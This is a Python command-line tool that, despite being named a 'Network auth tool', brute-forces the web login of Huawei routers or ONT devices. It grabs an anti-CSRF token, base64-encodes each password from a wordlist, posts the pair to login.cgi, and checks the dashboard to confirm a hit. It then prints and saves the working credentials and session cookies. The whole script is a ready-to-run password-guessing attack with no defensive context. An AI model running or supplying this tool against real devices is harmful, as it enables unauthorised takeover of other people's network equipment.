import argparse
import requests
import base64
import time
import sys

class NetAuth:
    def __init__(self, target, quiet=False):
        self.target = target
        self.quiet = quiet
        self.client = requests.Session()
        self.client.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
        })
        
    def msg(self, text, level="INFO"):
        colors = {
            "INFO": "\033[94m",
            "GOOD": "\033[92m", 
            "WARN": "\033[93m",
            "FAIL": "\033[91m",
            "FOUND": "\033[95m",
        }
        reset = "\033[0m"
        if level in colors:
            print(f"{colors[level]}[{level}]{reset} {text}")
        else:
            print(f"[{level}] {text}")
        if level in ["GOOD", "FOUND"] and not self.quiet:
            print(text)

    def grab_token(self):
        try:
            r = self.client.post(
                f"http://{self.target}/asp/GetRandCount.asp",
                headers={'X-Requested-With': 'XMLHttpRequest'},
                cookies={'Cookie': 'body:Language:arabic:id=-1'},
                timeout=10
            )
            tok = r.text.strip().replace('\ufeff', '')
            if self.quiet:
                self.msg(f"Token: {tok}", "INFO")
            return tok
        except Exception as e:
            self.msg(f"Token grab failed: {e}", "FAIL")
            return None

    def try_login(self, user, pwd):
        tok = self.grab_token()
        if not tok:
            return False, "No token"
        
        enc_pw = base64.b64encode(pwd.encode()).decode()
        login_payload = f"UserName={user}&PassWord={enc_pw}&x.X_HW_Token={tok}"
        
        try:
            login_r = self.client.post(
                f"http://{self.target}/login.cgi",
                data=login_payload,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                cookies={'Cookie': 'body:Language:arabic:id=-1'},
                allow_redirects=False,
                timeout=10
            )
            
            if 'Set-Cookie' in login_r.headers:
                sess = login_r.headers['Set-Cookie'].split(';')[0]
                
                dash_r = self.client.get(
                    f"http://{self.target}/index.asp",
                    cookies={'Cookie': sess},
                    timeout=10
                )
                
                if 'HUAWEI' in dash_r.text and len(dash_r.text) > 3000:
                    return True, sess
                else:
                    return False, "Bad dashboard"
            else:
                return False, "No session"
                
        except Exception as e:
            return False, f"Error: {e}"

    def run_check(self, users, passes, wait=2, stop_first=True):
        self.msg(f"Target: {self.target}", "INFO")
        self.msg(f"Users: {len(users)}, Passes: {len(passes)}", "INFO")
        self.msg(f"Wait: {wait}s, Stop on hit: {stop_first}", "INFO")
        print("-" * 50)
        
        total = len(users) * len(passes)
        count = 0
        found = []
        
        for u in users:
            for p in passes:
                count += 1
                perc = (count / total) * 100
                
                self.msg(f"{perc:.1f}% | Testing: {u}:{p}", "INFO")
                
                ok, msg = self.try_login(u, p)
                
                if ok:
                    self.msg(f"HIT: {u}:{p}", "GOOD")
                    self.msg(f"Session: {msg}", "GOOD")
                    found.append((u, p, msg))
                    
                    if stop_first:
                        return found
                else:
                    if self.quiet:
                        self.msg(f"Miss: {msg}", "WARN")
                
                if count < total:
                    time.sleep(wait)
        
        return found

def load_list(path):
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
        return lines
    except FileNotFoundError:
        print(f"File missing: {path}")
        return []
    except Exception as e:
        print(f"Read error {path}: {e}")
        return []

def main():
    parser = argparse.ArgumentParser(
        description="Network auth tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u admin -P passes.txt -t 5
  %(prog)s -U users.txt -P passes.txt -H 192.168.1.1 -t 3 -v
  %(prog)s -u admin -P passes.txt --no-stop
        """
    )
    
    parser.add_argument('-H', '--host', default='192.168.100.1',
                       help='Target IP (default: 192.168.100.1)')
    
    parser.add_argument('-u', '--user', 
                       help='Single username')
    
    parser.add_argument('-U', '--userfile', 
                       help='Username list file')
    
    parser.add_argument('-P', '--passfile', required=True,
                       help='Password list file (required)')
    
    parser.add_argument('-t', '--time', type=float, default=2,
                       help='Wait between tries in seconds (default: 2)')
    
    parser.add_argument('--no-stop', action='store_true',
                       help='Keep going after hit')
    
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='More output')
    
    parser.add_argument('-o', '--out',
                       help='Save results to file')
    
    args = parser.parse_args()
    
    if not args.user and not args.userfile:
        parser.error("Need --user or --userfile")
    
    if args.user and args.userfile:
        parser.error("Use --user OR --userfile")
    
    if args.userfile:
        users = load_list(args.userfile)
        if not users:
            sys.exit(1)
    else:
        users = [args.user]

    passes = load_list(args.passfile)
    if not passes:
        sys.exit(1)
    
    checker = NetAuth(args.host, quiet=args.verbose)
    
    print("\n" + "="*50)
    print("        NETWORK AUTH CHECK")
    print("="*50)
    print(f"Host: {args.host}")
    print(f"Users: {len(users)}")
    print(f"Passes: {len(passes)}")
    print(f"Total: {len(users) * len(passes)}")
    print(f"Delay: {args.time} sec")
    print("="*50 + "\n")
    
    if not args.verbose:
        resp = input("Start? (y/N): ")
        if resp.lower() not in ['y', 'yes']:
            print("Stopped.")
            sys.exit(0)
    
    try:
        results = checker.run_check(
            users=users,
            passes=passes,
            wait=args.time,
            stop_first=not args.no_stop
        )
        
        print("\n" + "="*50)
        print("          RESULTS")
        print("="*50)
        
        if results:
            checker.msg(f"Found {len(results)}:", "FOUND")
            for u, p, s in results:
                checker.msg(f"  {u}:{p}", "FOUND")
                if args.verbose:
                    checker.msg(f"  Session: {s}", "FOUND")
            
            if args.out:
                with open(args.out, 'w') as f:
                    for u, p, s in results:
                        f.write(f"User: {u}\n")
                        f.write(f"Pass: {p}\n")
                        f.write(f"Session: {s}\n")
                        f.write("-" * 30 + "\n")
                checker.msg(f"Saved: {args.out}", "GOOD")
        else:
            checker.msg("No hits", "WARN")
            
    except KeyboardInterrupt:
        print("\n" + "="*50)
        checker.msg("Stopped by user", "WARN")
    except Exception as e:
        checker.msg(f"Crash: {e}", "FAIL")

if __name__ == "__main__":
    main()
